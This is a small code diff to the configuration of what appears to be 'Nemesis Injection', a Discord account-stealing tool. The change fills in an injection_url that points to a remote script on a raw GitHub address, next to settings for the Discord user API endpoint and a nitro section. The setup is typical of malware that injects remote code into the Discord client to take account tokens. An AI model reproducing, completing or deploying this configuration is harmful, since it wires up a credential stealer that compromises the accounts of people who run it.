@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Nemesis Injection', 
   embed_icon: 'https://raw.githubusercontent.com/never-mind-who/never-mind-who/main/images/nemesis-removebg.png', 
   embed_color: 16777215, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/never-mind-who/Nemesis-Injection/master/clean.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
